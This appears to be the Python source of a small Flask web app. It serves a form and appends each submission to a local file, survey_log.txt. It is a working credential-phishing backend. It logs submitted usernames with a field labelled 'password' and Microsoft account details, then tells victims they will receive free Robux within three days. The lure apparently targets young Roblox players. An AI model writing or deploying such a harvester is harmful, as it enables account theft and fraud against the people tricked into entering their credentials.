from flask import Flask, render_template, request

app = Flask(__name__)

# This route serves your HTML file
@app.route('/')
def index():
    return render_template('index.html')

# This route handles the form submission
@app.route('/submit', methods=['POST'])
def handle_submission():
    # 'request.form' looks for the 'name' attribute in your HTML tags
    username = request.form.get('username')
    extra_text = request.form.get('text')
    reward_type = request.form.get('reward')
    confirmation = request.form.get('Conformation')
    microsoft_app = request.form.get('ji')


    # Save the data to a file on your computer
    with open("survey_log.txt", "a") as file:
        file.write(f"User: {username} | password: {extra_text} | Reward: {reward_type} | MSFT User: {confirmation} | MSFT App: {microsoft_app}\n")

    return f"<h1>Submission Received!</h1><p>Thanks {username}, we will verify your account, and robux will be sent to you in 3 days</p>"

if __name__ == '__main__':
    app.run(debug=True, port=5000)   